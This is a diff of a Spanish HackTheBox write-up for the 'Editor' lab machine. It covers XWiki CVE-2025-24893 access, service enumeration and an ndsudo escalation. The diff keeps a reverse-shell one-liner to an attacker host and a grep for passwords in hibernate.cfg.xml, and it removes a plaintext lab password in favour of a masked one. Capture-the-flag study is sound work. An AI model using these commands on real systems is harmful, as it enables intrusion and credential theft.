@@ -18,12 +18,7 @@ dificultad: Fácil
 
 > [!INFO] Introducción
 >  Editor es una máquina Linux de dificultad `Easy` en HackTheBox donde debemos vulnerar el servicio web `XWiki` para ganar acceso inicial. Enumeración básica del sistema y un CVE en la herramienta `ndsudo` nos permitirán obtener control completo sobre Editor.
-^descripcion
 
-> [!FAQ]- Pistas
-> #tutorial : ayuda que se proporcione y se quiera añadir al *writeup*.
-> Este *callout* siempre aparece plegado por defecto.
-^pistas
 
 # Reconocimiento
 
@@ -129,7 +124,7 @@ Al usar la dirección IP de la máquina objetivo en un navegador se nos intenta 
 
 Al visitar la página de nuevo podemos encontrar el inicio donde podemos descargar una archivo .deb. La página es sobre un editor de código.
 
-![[HTB-Editor-MainPage.png]]
+![HTB-Editor-MainPage.png](https://github.com/Andrein99/Ciberseguridad-Machinas-CTFs/blob/main/HackTheBox/Linux-Machines/Easy/Archivos%20adjuntos/HTB-Editor-MainPage.png)
 
 Al entrar en el apartado  `Docs` se nos redirige a un subdominio `wiki.editor.htb`, por lo que tenemos que añadir este subdominio en el archivo `/etc/hosts` para que los resuelva correctamente.
 
@@ -143,7 +138,7 @@ Recargando la página tenemos que en este subdominio está corriendo una aplicac
 > [!Info] XWiki
 > [`XWiki`](https://xwiki.com/en/) es una plataforma wiki de código abierto escrita en Java, que permite a los usuarios crear, colaborar y organizar información en línea.
 
-![[HTB-Editor-XWiki.png]]
+![HTB-Editor-XWiki.png](https://github.com/Andrein99/Ciberseguridad-Machinas-CTFs/blob/main/HackTheBox/Linux-Machines/Easy/Archivos%20adjuntos/HTB-Editor-XWiki.png)
 
 # Análisis de vulnerabilidades
 
@@ -154,7 +149,7 @@ Esta vulnerabilidad en XWiki permite la ejecución de comandos en el servidor **
 
 Al buscar en [`CVEDetails`](https://www.cvedetails.com/cve/CVE-2025-24893/) podemos encontrar los rangos de versiones de la aplicación que podrían ser vulnerables a este exploit. En nuestro caso nos es relevante el intervalo comprendido entre la versión `5.3-milestone-2` y las anteriores a `15.10.11` ya que la versión de aplicación es `15.10.8` que se encuentra en el intervalo. 
 
-![[HTB-Editor-VulnInterval.png]]
+![HTB-Editor-VulnInterval.png](https://github.com/Andrein99/Ciberseguridad-Machinas-CTFs/blob/main/HackTheBox/Linux-Machines/Easy/Archivos%20adjuntos/HTB-Editor-VulnInterval.png)
 
 >[!Info] Más información
 >Para una información más a detalle podemos ver la siguiente entrada de OffSec [aquí](https://www.offsec.com/blog/cve-2025-24893/).
@@ -231,7 +226,7 @@ listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
 >[!Bug] Problema con comandos complejos
 >Sin embargo, si queremos realizar comandos más complejos como el siguiente para obtener una shell reversa, no va a funcionar.
 >``` shell
-bash -c 'bash -i >& /dev/tcp/<ip-máquina-atacante>/<puerto-para-recibir-conexión> 0>&1'
+>  bash -c 'bash -i >& /dev/tcp/<ip-máquina-atacante>/<puerto-para-recibir-conexión> 0>&1'
 >```
 
 `xwiki` espera que las plantillas tengan cierta estructura XML/HTML válida, entonces el payload debe ser cuidadosamente construido para no romper la plantilla original ni causar errores de `parsing`.
@@ -369,7 +364,7 @@ Podemos analizar el contenido de este fichero para ver si hay alguna contraseña
 
 ```shell
 xwiki@editor:/etc/xwiki$ cat hibernate.cfg.xml | grep -E "pass|password|passwd"
-    <property name="hibernate.connection.password">theEd1t0rTeam99</property>
+    <property name="hibernate.connection.password">th*********</property>
     <property name="hibernate.connection.password">xwiki</property>
     <property name="hibernate.connection.password">xwiki</property>
     <property name="hibernate.connection.password"></property>
@@ -478,20 +473,20 @@ oliver@editor:~$ find / -perm -4000 2>/dev/null
 >Adicionalmente, podemos ver los puertos que están escuchando para ver servicios internos:
 >
 >```shell
-oliver@editor:~$ ss -tnl
-State        Recv-Q       Send-Q                  Local Address:Port               Peer Address:Port       Process       
-LISTEN       0            4096                        127.0.0.1:45539                   0.0.0.0:*                        
-LISTEN       0            70                          127.0.0.1:33060                   0.0.0.0:*                        
-LISTEN       0            4096                    127.0.0.53%lo:53                      0.0.0.0:*                        
-LISTEN       0            128                           0.0.0.0:22                      0.0.0.0:*                        
-LISTEN       0            511                           0.0.0.0:80                      0.0.0.0:*                        
-LISTEN       0            151                         127.0.0.1:3306                    0.0.0.0:*                        
-LISTEN       0            4096                        127.0.0.1:19999                   0.0.0.0:*                        
-LISTEN       0            4096                        127.0.0.1:8125                    0.0.0.0:*                        
-LISTEN       0            50                                  *:8080                          *:*                        
-LISTEN       0            128                              [::]:22                         [::]:*                        
-LISTEN       0            511                              [::]:80                         [::]:*                        
-LISTEN       0            50                 [::ffff:127.0.0.1]:8079                          *:*                    
+>oliver@editor:~$ ss -tnl
+>State        Recv-Q       Send-Q                  Local Address:Port               Peer Address:Port       Process       
+>LISTEN       0            4096                        127.0.0.1:45539                   0.0.0.0:*                        
+>LISTEN       0            70                          127.0.0.1:33060                   0.0.0.0:*                        
+>LISTEN       0            4096                    127.0.0.53%lo:53                      0.0.0.0:*                        
+>LISTEN       0            128                           0.0.0.0:22                      0.0.0.0:*                        
+>LISTEN       0            511                           0.0.0.0:80                      0.0.0.0:*                        
+>LISTEN       0            151                         127.0.0.1:3306                    0.0.0.0:*                        
+>LISTEN       0            4096                        127.0.0.1:19999                   0.0.0.0:*                        
+>LISTEN       0            4096                        127.0.0.1:8125                    0.0.0.0:*                        
+>LISTEN       0            50                                  *:8080                          *:*                        
+>LISTEN       0            128                              [::]:22                         [::]:*                        
+>LISTEN       0            511                              [::]:80                         [::]:*                        
+>LISTEN       0            50                 [::ffff:127.0.0.1]:8079                          *:*                    
 >```
 >
 >En donde podemos notar servicios corriendo en `localhost` en los puertos 45539, 33060, 3306, 19999 y 8125. El puerto 3306 suele ser el puerto para `mysql`, y probablemente el puerto 33060 esté relacionado, pero los otros puertos resultan interesantes, y probablemente esté corriendo el programa `netdata` en alguno de estos puertos.
